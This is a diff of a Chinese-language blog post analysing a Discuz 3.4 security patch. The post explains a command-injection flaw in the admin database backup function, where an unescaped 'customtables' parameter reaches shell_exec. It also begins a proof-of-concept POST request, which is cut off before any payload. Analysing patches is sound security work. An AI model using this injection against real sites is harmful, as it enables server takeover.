@@ -7,6 +7,7 @@
 ----
 ![](https://github.com/white-cell/blog/raw/master/20180612-discuz3.4补丁更新分析/pic/命令执行1.jpg)
 如图所示，问题出在后台数据库备份功能，增加了escapeshellarg()函数来过滤 $tablesstr参数。
+![](https://github.com/white-cell/blog/raw/master/20180612-discuz3.4补丁更新分析/pic/数据库备份.jpg)
 /discuz3.4/upload/source/admincp/admincp_db.php
 ```php
 if($operation == 'export') {
@@ -66,6 +67,7 @@ if($operation == 'export') {
 ```
 $_GET['customtables'] >> $tables >> $tablesstr 
 参数没有经过过滤、转义直接拼接到shell_exec中可被利用命令执行
+
 利用构造POC：
 ```
 POST /discuz3.4/upload/admin.php?action=db&operation=export&setup=1 HTTP/1.1
